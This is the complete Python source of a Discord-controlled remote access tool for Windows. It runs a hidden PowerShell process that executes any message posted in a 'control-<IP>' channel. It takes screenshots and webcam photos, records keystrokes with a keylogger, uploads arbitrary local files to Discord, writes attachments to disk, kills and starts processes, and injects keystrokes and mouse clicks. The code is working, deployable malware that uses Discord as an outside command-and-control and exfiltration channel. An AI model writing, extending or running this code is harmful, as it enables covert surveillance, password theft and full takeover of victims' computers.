import discord
from discord.ext import commands
import subprocess
import requests
import os
import pyautogui
from io import BytesIO
import asyncio
import sys
import time
import threading
from datetime import datetime
from dotenv import load_dotenv
import atexit
import platform
import psutil
import cv2



KEYBOARD_AVAILABLE = False
try:
    import keyboard as kb
    KEYBOARD_AVAILABLE = True
except ImportError:
    pass

PYDIRECTINPUT_AVAILABLE = False
try:
    import pydirectinput
    PYDIRECTINPUT_AVAILABLE = True
except ImportError:
    pass

PSUTIL_AVAILABLE = False
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    pass


def load_environment():
    """Load .env file, works both as script and frozen executable."""
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(__file__)
    env_path = os.path.join(base_path, ".env")
    load_dotenv(env_path)

load_environment()

TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    print("Error: DISCORD_TOKEN not found in .env file")
    sys.exit(1)


DOWNLOAD_FOLDER = "C:/DiscordDownloads"
if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER)

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Global state
target_channel = None
ps_process = None
keylogger_active = False
keylog_buffer = []
keylogger_thread = None



def keylogger_callback(event):
    """Callback function for keylogger."""
    global keylog_buffer
    try:
        if event.event_type == kb.KEY_DOWN:
            key_name = event.name
            
            # Handle special keys
            special_keys = {
                'space': ' ',
                'enter': '\n[ENTER]\n',
                'tab': '[TAB]',
                'backspace': '[BACKSPACE]',
                'delete': '[DEL]',
                'esc': '[ESC]',
                'shift': '[SHIFT]',
                'ctrl': '[CTRL]',
                'alt': '[ALT]',
                'windows': '[WIN]',
                'caps lock': '[CAPS]',
                'up': '[UP]',
                'down': '[DOWN]',
                'left': '[LEFT]',
                'right': '[RIGHT]',
            }
            
            if key_name in special_keys:
                keylog_buffer.append(special_keys[key_name])
            elif len(key_name) == 1:
                keylog_buffer.append(key_name)
            else:
                keylog_buffer.append(f'[{key_name.upper()}]')
                
    except Exception as e:
        print(f"Keylogger error: {e}")

def start_keylogger_thread():
    """Start keylogger in separate thread."""
    global keylogger_active
    try:
        if KEYBOARD_AVAILABLE:
            kb.hook(keylogger_callback)
            keylogger_active = True
            print("Keylogger thread started")
        else:
            print("Keyboard module not available")
    except Exception as e:
        print(f"Failed to start keylogger: {e}")

def stop_keylogger_thread():
    """Stop keylogger."""
    global keylogger_active
    try:
        if KEYBOARD_AVAILABLE:
            kb.unhook_all()
        keylogger_active = False
        print("Keylogger stopped")
    except Exception as e:
        print(f"Failed to stop keylogger: {e}")


async def execute_cmd(command: str) -> str:
    """Execute PowerShell command with timeout protection."""
    global ps_process
    if ps_process is None or ps_process.poll() is not None:
        return "PowerShell process is not active"

    marker = "__CMD_DONE__"
    wrapper = f"""
try {{
    {command}
}} catch {{
    Write-Output "$($_.Exception.Message)"
}}
Write-Output "{marker}"
"""

    try:
        ps_process.stdin.write(wrapper + "\n")
        ps_process.stdin.flush()
    except Exception as e:
        return f"Failed to send command: {str(e)}"

    output = []
    timeout_seconds = 30

    try:
        async with asyncio.timeout(timeout_seconds):
            while True:
                line = await asyncio.get_running_loop().run_in_executor(
                    None, ps_process.stdout.readline
                )
                if not line:
                    break
                line = line.rstrip()
                if marker in line:
                    break
                if line:
                    output.append(line)
        return "\n".join(output) or "(no output)"
    except asyncio.TimeoutError:
        return f"[TIMEOUT after {timeout_seconds}s] Command may still be running"
    except Exception as e:
        return f"Execution error: {str(e)}"


def simulate_keyboard_with_modifiers(text):
    """Simulate keyboard with support for uppercase and special characters."""
    try:
        
        shift_chars = {
            '!': '1', '@': '2', '#': '3', '$': '4', '%': '5',
            '^': '6', '&': '7', '*': '8', '(': '9', ')': '0',
            '_': '-', '+': '=', '{': '[', '}': ']', '|': '\\',
            ':': ';', '"': "'", '<': ',', '>': '.', '?': '/',
            '~': '`', 'A': 'a', 'B': 'b', 'C': 'c', 'D': 'd',
            'E': 'e', 'F': 'f', 'G': 'g', 'H': 'h', 'I': 'i',
            'J': 'j', 'K': 'k', 'L': 'l', 'M': 'm', 'N': 'n',
            'O': 'o', 'P': 'p', 'Q': 'q', 'R': 'r', 'S': 's',
            'T': 't', 'U': 'u', 'V': 'v', 'W': 'w', 'X': 'x',
            'Y': 'y', 'Z': 'z'
        }
        
        for char in text:
            if char in shift_chars:
                # Character requiring SHIFT
                pyautogui.keyDown('shift')
                pyautogui.press(shift_chars[char])
                pyautogui.keyUp('shift')
            elif char == '\n':
                pyautogui.press('enter')
            elif char == '\t':
                pyautogui.press('tab')
            else:
                # Normal character
                pyautogui.press(char)
            time.sleep(0.01)  # Small delay between keystrokes
    except Exception as e:
        raise e


async def process_single_key(key_input, ctx, send_response=False):
    """Process a single key or key combination."""
    key_input = key_input.lower().strip()
    
    # Extended key mapping
    key_map = {
        # Basic keys
        'enter': 'enter', 'return': 'enter',
        'tab': 'tab',
        'space': 'space',
        'backspace': 'backspace',
        'delete': 'delete', 'del': 'delete',
        'escape': 'esc', 'esc': 'esc',
        'shift': 'shift',
        'ctrl': 'ctrl', 'control': 'ctrl',
        'alt': 'alt',
        'windows': 'win', 'win': 'win',
        'capslock': 'capslock', 'caps': 'capslock',
        
        'up': 'up', 'down': 'down', 'left': 'left', 'right': 'right',
        
        'f1': 'f1', 'f2': 'f2', 'f3': 'f3', 'f4': 'f4',
        'f5': 'f5', 'f6': 'f6', 'f7': 'f7', 'f8': 'f8',
        'f9': 'f9', 'f10': 'f10', 'f11': 'f11', 'f12': 'f12',
    }
    
    
    mouse_buttons = {
        'left': 'left', 'leftclick': 'left', 'mouse1': 'left',
        'right': 'right', 'rightclick': 'right', 'mouse2': 'right',
        'middle': 'middle', 'center': 'middle', 'mouse3': 'middle'
    }
    
   
    if key_input in mouse_buttons:
        mouse_action = mouse_buttons[key_input]
        
        
        try:
            if PYDIRECTINPUT_AVAILABLE:
                pydirectinput.click(button=mouse_action)
            else:
                pyautogui.click(button=mouse_action)
            
            button_names = {
                'left': 'left',
                'right': 'right', 
                'middle': 'middle/wheel'
            }
            
            if send_response:
                await ctx.send(f"Mouse {button_names[mouse_action]} click executed")
            return f"mouse_{mouse_action}"
        except Exception as e:
            if send_response:
                await ctx.send(f"Mouse click error: {str(e)}")
            return f"error: {str(e)}"
    
    
    if '+' in key_input:
        keys = [k.strip() for k in key_input.split('+')]
        
        try:
            
            for key in keys:
                mapped_key = key_map.get(key.lower(), key.lower())
                if PYDIRECTINPUT_AVAILABLE:
                    pydirectinput.keyDown(mapped_key)
                else:
                    pyautogui.keyDown(mapped_key)
            
            time.sleep(0.05)
            
            for key in reversed(keys):
                mapped_key = key_map.get(key.lower(), key.lower())
                if PYDIRECTINPUT_AVAILABLE:
                    pydirectinput.keyUp(mapped_key)
                else:
                    pyautogui.keyUp(mapped_key)
            
            if send_response:
                await ctx.send(f"Pressed combination: {key_input}")
            return f"combination: {key_input}"
            
        except Exception as e:
            if send_response:
                await ctx.send(f"Error with combination {key_input}: {str(e)}")
            return f"error: {str(e)}"
    
    if len(key_input) == 1 and key_input.isalpha() and key_input.isupper():
        # Single uppercase letter
        try:
            if PYDIRECTINPUT_AVAILABLE:
                pydirectinput.keyDown('shift')
                pydirectinput.press(key_input.lower())
                pydirectinput.keyUp('shift')
            else:
                pyautogui.keyDown('shift')
                pyautogui.press(key_input.lower())
                pyautogui.keyUp('shift')
            
            if send_response:
                await ctx.send(f"Pressed key: {key_input} (uppercase)")
            return f"key: {key_input}"
            
        except Exception as e:
            if send_response:
                await ctx.send(f"Error pressing uppercase {key_input}: {str(e)}")
            return f"error: {str(e)}"
    
    mapped_key = key_map.get(key_input, key_input)
    
    try:
        if PYDIRECTINPUT_AVAILABLE:
            pydirectinput.press(mapped_key)
        else:
            pyautogui.press(mapped_key)
        
        if send_response:
            await ctx.send(f"Pressed key: {key_input} ({mapped_key})")
        return f"key: {key_input}"
        
    except Exception as e:
        if send_response:
            await ctx.send(f"Error pressing key {key_input}: {str(e)}")
        return f"error: {str(e)}"


@bot.event
async def on_ready():
    """Initialize bot and create control channel."""
    global target_channel, ps_process
    print(f"Bot logged in as {bot.user} (ID: {bot.user.id})")

    try:
        ps_process = subprocess.Popen(
            ['powershell', '-NoLogo', '-NoExit', '-Command', '-'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
        )
        print("PowerShell process started")
    except Exception as e:
        print(f"Failed to start PowerShell: {e}")
        ps_process = None

    ip = "unknown"
    try:
        ip = requests.get('https://api.ipify.org', timeout=8).text.replace('.', '-')
    except:
        pass

    if not bot.guilds:
        print("No guilds found")
        return

    guild = bot.guilds[0]
    existing = [c for c in guild.text_channels if c.name.startswith("control-")]
    if existing:
        target_channel = existing[0]
        print(f"Reusing control channel: {target_channel.name}")
    else:
        try:
            target_channel = await guild.create_text_channel(f"control-{ip}")
            print(f"Created control channel: {target_channel.name}")
        except discord.Forbidden:
            print("Missing permissions to create channel")
            return
        except Exception as e:
            print(f"Channel creation failed: {e}")
            return

    startup = (
        f"Control channel: {target_channel.mention}\n"
        f"Bot ID: {bot.user.id}\n"
        f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        "Available commands:\n"
        "- PowerShell commands (type directly, no prefix)\n"
        "- !commands     Show command list\n"
        "- !load         Save attachments\n"
        "- !download <path>  Upload file\n"
        "- !screenshot   Capture screen\n"
        "- !sysinfo      Show system information\n"
        "- !kill <process>  Kill process by name\n"
        "- !start <app>     Start application\n"
        "- !type <text>     Type text on keyboard\n"
        "- !press <key>     Press specific key or mouse button\n"
        "- !click <button> <count>  Click mouse button\n"
        "- !keylog <action>  Keylogger controls"
    )
    await target_channel.send(f"```\nService online and ready\n\n{startup}\n```")

@bot.command(name='webcam')
async def webcam_snap(ctx):
    """
    Takes ONE photo from the default webcam and sends it to Discord.
    """
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        await ctx.send("Camera not available or already in use.")
        return
    try:
        await asyncio.sleep(0.5)
        ret, frame = cap.read()
        if not ret:
            await ctx.send("Failed to capture image from webcam.")
            return
        
        success, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 75])
        if not success:
            await ctx.send("Failed to encode image.")
            return
        bio = BytesIO(buffer.tobytes())
        filename = f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        file = discord.File(bio, filename=filename)
        
        # Send the photo
        await ctx.send("Webcam photo:", file=file)
        
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")
    
    finally:
        cap.release()




@bot.command(name='commands')
async def show_commands(ctx):
    """Display list of available commands."""
    commands_text = (
        "Available commands:\n\n"
        "!commands          - Show this list\n"
        "!screenshot        - Capture and upload screenshot\n"
        "!load [folder]     - Save message attachments to disk\n"
        "!download <path>   - Upload file from disk\n"
        "!sysinfo           - Show system information\n"
        "!kill <name>       - Kill process by name\n"
        "!start <app>       - Start application\n"
        "!type <text>       - Type text on keyboard\n"
        "!press <key>       - Press key or mouse button\n"
        "!click <button> <count> - Click mouse button\n"
        "!keylog <action>   - Keylogger controls (start/stop/clear/show)\n\n"
        "PowerShell:\n"
        "Type any command directly in the control channel (no prefix)\n\n"
        "Examples:\n"
        "!kill chrome\n"
        "!start notepad\n"
        "!type Hello World\n"
        "!press enter\n"
        "!press ctrl+c\n"
        "!click left 3\n"
        "!keylog start"
    )
    
    embed = discord.Embed(title="Command List", description=commands_text, color=0x7289DA)
    await ctx.send(embed=embed)


@bot.command(name='sysinfo')
async def system_info(ctx):
    """Display basic system information."""
    try:
        info = [
            f"OS: {platform.system()} {platform.release()}",
            f"Node: {platform.node()}",
            f"User: {os.getlogin()}",
            f"CPU cores: {psutil.cpu_count(logical=False)}",
            f"CPU usage: {psutil.cpu_percent()}%",
            f"RAM total: {psutil.virtual_memory().total / (1024**3):.1f} GB",
            f"RAM used: {psutil.virtual_memory().percent}%",
            f"Python version: {sys.version.split()[0]}",
            f"Modules: keyboard={KEYBOARD_AVAILABLE}, pydirectinput={PYDIRECTINPUT_AVAILABLE}"
        ]
        await ctx.send("System Information:\n" + "\n".join(info))
    except Exception as e:
        await ctx.send(f"Error retrieving system info: {str(e)}")


@bot.command(name='load')
async def load_attachments(ctx, folder: str = DOWNLOAD_FOLDER):
    """Save all message attachments to the specified folder."""
    if not ctx.message.attachments:
        await ctx.send("No attachments in this message.")
        return

    os.makedirs(folder, exist_ok=True)
    saved = []

    for att in ctx.message.attachments:
        path = os.path.join(folder, att.filename)
        try:
            await att.save(path)
            saved.append(att.filename)
        except Exception as e:
            await ctx.send(f"Failed to save {att.filename}: {e}")
            return

    await ctx.send(f"Saved {len(saved)} file(s) to {folder}:\n" + "\n".join(saved))


@bot.command(name='screenshot')
async def take_screenshot(ctx):
    """Capture and upload a screenshot."""
    try:
        img = pyautogui.screenshot()
        bio = BytesIO()
        img.save(bio, format='PNG')
        bio.seek(0)

        file = discord.File(bio, filename=f"screenshot_{int(time.time())}.png")
        await ctx.send("Screenshot captured:", file=file)
    except Exception as e:
        await ctx.send(f"Screenshot failed: {e}")


@bot.command(name='download')
async def upload_file(ctx, *, file_path: str):
    """Upload a file from the local disk."""
    file_path = file_path.strip('"\'')
    if not os.path.isfile(file_path):
        await ctx.send("File not found or is a directory.")
        return

    size_mb = os.path.getsize(file_path) / (1024 * 1024)
    if size_mb > 25:
        await ctx.send(f"File too large ({size_mb:.1f} MB). Discord limit: 25 MB.")
        return

    try:
        file = discord.File(file_path, filename=os.path.basename(file_path))
        await ctx.send(f"File uploaded: {os.path.basename(file_path)}", file=file)
    except Exception as e:
        await ctx.send(f"Upload failed: {e}")


@bot.command(name='kill')
async def kill_process(ctx, *, process_name: str):
    """Kill a process by name."""
    try:
        # Remove .exe if present
        if process_name.lower().endswith('.exe'):
            process_name = process_name[:-4]
        
        if PSUTIL_AVAILABLE:
            killed = []
            for proc in psutil.process_iter(['name', 'pid']):
                try:
                    if proc.info['name'] and process_name.lower() in proc.info['name'].lower():
                        psutil.Process(proc.info['pid']).kill()
                        killed.append(f"{proc.info['name']} (PID: {proc.info['pid']})")
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            if killed:
                await ctx.send(f"Killed {len(killed)} process(es):\n" + "\n".join(killed))
            else:
                await ctx.send(f"No process found with name: {process_name}")
        else:
            # Alternative PowerShell method
            cmd = f'taskkill /F /IM "{process_name}.exe" /T'
            result = await execute_cmd(cmd)
            if "SUCCESS" in result.upper():
                await ctx.send(f"Successfully killed: {process_name}")
            else:
                await ctx.send(f"Failed to kill {process_name}:\n{result}")
                
    except Exception as e:
        await ctx.send(f"Error killing process: {str(e)}")


@bot.command(name='start')
async def start_application(ctx, *, app_name: str):
    """Start an application."""
    try:
        app_name = app_name.strip('"').strip("'")
        
        # If it's a full path
        if os.path.exists(app_name):
            cmd = f'Start-Process "{app_name}"'
        # If it's just the name
        else:
            # Try various formats
            if not app_name.endswith('.exe'):
                app_name += '.exe'
            cmd = f'Start-Process "{app_name}"'
        
        result = await execute_cmd(cmd)
        
        if result == "(no output)":
            await ctx.send(f"Started application: {app_name}")
        else:
            await ctx.send(f"Result:\n{result}")
            
    except Exception as e:
        await ctx.send(f"Error starting application: {str(e)}")


@bot.command(name='type')
async def type_text(ctx, *, text: str):
    """Type text using keyboard simulation with proper case handling."""
    try:
        if not PYDIRECTINPUT_AVAILABLE and not hasattr(pyautogui, 'write'):
            await ctx.send("Typing functionality not available (missing modules)")
            return
        
        # Replace special sequences
        text = text.replace('\\n', '\n').replace('\\t', '\t').replace('\\r', '\r')
        
        # Use pydirectinput if available
        if PYDIRECTINPUT_AVAILABLE:
            try:
                # For short text, use hotkeys for special characters
                if len(text) <= 100:
                    simulate_keyboard_with_modifiers(text)
                else:
                    # For long text, use write with interval
                    pyautogui.write(text, interval=0.05)
            except:
                # Fallback to pyautogui
                pyautogui.write(text, interval=0.05)
        else:
            # Use standard pyautogui
            pyautogui.write(text, interval=0.05)
        
        preview = text.replace('\n', '\\n').replace('\t', '\\t')
        if len(preview) > 100:
            preview = preview[:100] + "..."
        
        await ctx.send(f"Typed text: {preview}")
        
    except Exception as e:
        await ctx.send(f"Error typing text: {str(e)}")


@bot.command(name='press')
async def press_key(ctx, *, key_input: str):
    """Press a specific key, key combination, or mouse button."""
    try:
        key_input = key_input.strip()
        
        # Check for multiple sequences separated by comma
        if ',' in key_input:
            keys = [k.strip() for k in key_input.split(',')]
            results = []
            
            for key in keys:
                result = await process_single_key(key, ctx)
                results.append(result)
                time.sleep(0.1)  # Small pause between sequences
            
            await ctx.send(f"Pressed sequence: {key_input}\nResults: {' | '.join(results)}")
            return
        
        # Process single key or combination
        await process_single_key(key_input, ctx, send_response=True)
        
    except Exception as e:
        await ctx.send(f"Error pressing key: {str(e)}")


@bot.command(name='click')
async def mouse_click(ctx, button: str = "left", count: int = 1):
    """Click mouse button multiple times."""
    try:
        button = button.lower().strip()
        
        # Mouse button mapping
        button_map = {
            'left': 'left', 'l': 'left', 'mouse1': 'left',
            'right': 'right', 'r': 'right', 'mouse2': 'right',
            'middle': 'middle', 'm': 'middle', 'center': 'middle', 'mouse3': 'middle'
        }
        
        if button not in button_map:
            await ctx.send("Invalid button. Use: left, right, or middle")
            return
        
        mapped_button = button_map[button]
        
        # Limit number of clicks
        if count > 20:
            count = 20
            await ctx.send("Number of clicks limited to 20 for safety")
        
        # Execute clicks
        try:
            for i in range(count):
                if PYDIRECTINPUT_AVAILABLE:
                    pydirectinput.click(button=mapped_button)
                else:
                    pyautogui.click(button=mapped_button)
                
                # Small pause between clicks
                if count > 1:
                    time.sleep(0.1)
            
            button_names = {
                'left': 'left',
                'right': 'right',
                'middle': 'middle'
            }
            
            if count == 1:
                await ctx.send(f"Mouse {button_names[mapped_button]} click executed")
            else:
                await ctx.send(f"{count} mouse {button_names[mapped_button]} clicks executed")
                
        except Exception as e:
            await ctx.send(f"Error during click: {str(e)}")
            
    except Exception as e:
        await ctx.send(f"Click command error: {str(e)}")


@bot.command(name='keylog')
async def keylogger_control(ctx, action: str = None):
    """Control keylogger: start, stop, clear, show."""
    global keylogger_active, keylog_buffer, keylogger_thread
    
    if not KEYBOARD_AVAILABLE:
        await ctx.send("Keylogger not available (keyboard module missing)")
        return
    
    if action is None:
        status = "ACTIVE" if keylogger_active else "INACTIVE"
        buffer_size = len(keylog_buffer)
        chars = len(''.join(keylog_buffer))
        await ctx.send(
            f"Keylogger Status: {status}\n"
            f"Buffer: {buffer_size} keystrokes ({chars} characters)\n"
            f"Commands: !keylog start|stop|clear|show"
        )
        return
    
    action = action.lower()
    
    if action == 'start':
        if keylogger_active:
            await ctx.send("Keylogger is already running")
            return
        
        keylog_buffer.clear()
        if keylogger_thread is None or not keylogger_thread.is_alive():
            keylogger_thread = threading.Thread(target=start_keylogger_thread, daemon=True)
            keylogger_thread.start()
            await asyncio.sleep(0.5)
        
        await ctx.send("Keylogger STARTED - Capturing keystrokes...")
        
    elif action == 'stop':
        if not keylogger_active:
            await ctx.send("Keylogger is not running")
            return
        
        stop_keylogger_thread()
        buffer_size = len(keylog_buffer)
        await ctx.send(f"Keylogger STOPPED - Captured {buffer_size} keystrokes")
        
    elif action == 'clear':
        keylog_buffer.clear()
        await ctx.send("Keylog buffer CLEARED")
        
    elif action == 'show':
        if not keylog_buffer:
            await ctx.send("Keylog buffer is empty")
            return
        
        # Combine buffer
        keystrokes = ''.join(keylog_buffer)
        
        # Format output
        if len(keystrokes) > 1500:
            keystrokes = keystrokes[:1500] + "\n\n... (truncated, use !download for full log)"
        
        embed = discord.Embed(
            title="Captured Keystrokes",
            description=f"```{keystrokes}```",
            color=0xff9900
        )
        embed.add_field(name="Total", value=f"{len(keylog_buffer)} keystrokes")
        await ctx.send(embed=embed)
        
    else:
        await ctx.send("Invalid action. Use: start, stop, clear, or show")


@bot.event
async def on_message(message):
    """Handle incoming messages."""
    if message.author.bot:
        return

    global target_channel

    if message.content.startswith(bot.command_prefix):
        await bot.process_commands(message)
        return

    if target_channel and message.channel.id == target_channel.id:
        if message.content.strip():
            print(f"```ps\nExecuting: {message.content[:50]}{'...' if len(message.content) > 50 else ''}\n```")
            result = await execute_cmd(message.content)
            if result:
                chunks = [result[i:i+1990] for i in range(0, len(result), 1990)]
                for chunk in chunks:
                    await message.channel.send(f"```powershell\n{chunk}\n```")
            else:
                await message.channel.send("```(no output)```")

    await bot.process_commands(message)


@bot.event
async def on_command_error(ctx, error):
    """Handle command errors."""
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"Command not found. Use !commands to see available commands.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"Missing argument. Usage: {ctx.prefix}{ctx.command.name} {ctx.command.signature}")
    else:
        await ctx.send(f"Error: {str(error)[:100]}")


@atexit.register
def cleanup():
    """Cleanup resources on exit."""
    global ps_process, keylogger_active
    
    if keylogger_active and KEYBOARD_AVAILABLE:
        stop_keylogger_thread()
    
    if ps_process and ps_process.poll() is None:
        ps_process.terminate()
        print("PowerShell process terminated")
    
    print("Bot shutdown complete")


if __name__ == "__main__":
    print("Starting bot...")
    print(f"Python version: {sys.version}")
    print(f"Discord.py version: {discord.__version__}")
    print(f"Modules: keyboard={KEYBOARD_AVAILABLE}, pydirectinput={PYDIRECTINPUT_AVAILABLE}, psutil={PSUTIL_AVAILABLE}")
    
    try:
        bot.run(TOKEN)
    except discord.LoginFailure:
        print("Invalid token - check .env file")
    except KeyboardInterrupt:
        print("Bot stopped by user")
    except Exception as e:
        print(f"Fatal error: {e}")